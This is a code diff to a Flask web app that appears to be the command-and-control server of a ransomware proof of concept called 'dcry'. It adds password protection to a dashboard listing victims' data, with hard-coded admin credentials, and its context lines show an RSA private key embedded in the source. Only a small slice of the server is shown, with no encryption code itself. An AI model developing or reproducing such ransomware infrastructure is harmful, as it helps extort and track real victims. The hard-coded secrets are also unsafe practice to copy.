@@ -18,6 +18,7 @@ from datetime import datetime, timedelta
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from flask_wtf.csrf import CSRFProtect
+from flask_httpauth import HTTPBasicAuth
 from markupsafe import escape as flask_escape
 from flask import (
     Flask,
@@ -82,6 +83,10 @@ JuFhYChYqOk47EbQPBHRLaOlq2fLTsxPDZ3wje0DBsnLZ/2e2pHv2efaIA==
 -----END RSA PRIVATE KEY-----"""
 
 app = Flask(__name__)
+auth = HTTPBasicAuth()
+users = {
+    "dcry_admin": "dcry-ransomware-poc" 
+}
 app.config["SECRET_KEY"] = "dcry-ransomware-poc"
 csrf = CSRFProtect(app)
 
@@ -212,11 +217,15 @@ def dashboard_data():
     victims = get_victims_data()
     return jsonify(victims)
 
+@auth.verify_password
+def verify_password(username, password):
+    if username in users and users[username] == password:
+        return username
+
 @app.route("/dashboard")
+@auth.login_required
 def dashboard(): 
     victims_data = get_victims_data()
-    # no password?
-    # this is not a bug, it is a feature
     html = """
 <!DOCTYPE html>
 <html lang="vi" data-bs-theme="dark">
